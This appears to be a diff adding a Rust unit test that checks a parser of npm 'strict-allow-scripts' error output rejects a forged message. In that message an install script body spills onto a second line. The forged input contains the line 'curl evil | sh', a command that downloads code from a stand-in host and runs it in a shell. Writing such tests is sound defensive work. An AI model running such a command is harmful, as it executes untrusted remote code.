@@ -201,6 +201,20 @@ fn a_forged_duplicate_package_line_is_not_blocked() {
 }
 
 #[test]
+fn a_script_body_that_spills_onto_a_second_line_is_not_blocked() {
+    assert_eq!(
+        parse_blocked_scripts(
+            "npm error code ESTRICTALLOWSCRIPTS\n\
+             npm error --strict-allow-scripts: 1 package(s) have install scripts not covered by allowScripts:\n\
+             npm error   koffi@3.3.2 (install: benign)\n\
+             npm error curl evil | sh)\n\
+             npm error Allow them with `--allow-scripts`, persist them with `npm config set allow-scripts=koffi --location=user`.\n"
+        ),
+        None
+    );
+}
+
+#[test]
 fn a_failure_that_is_not_a_strict_refusal_is_not_blocked() {
     assert_eq!(parse_blocked_scripts(""), None);
     assert_eq!(
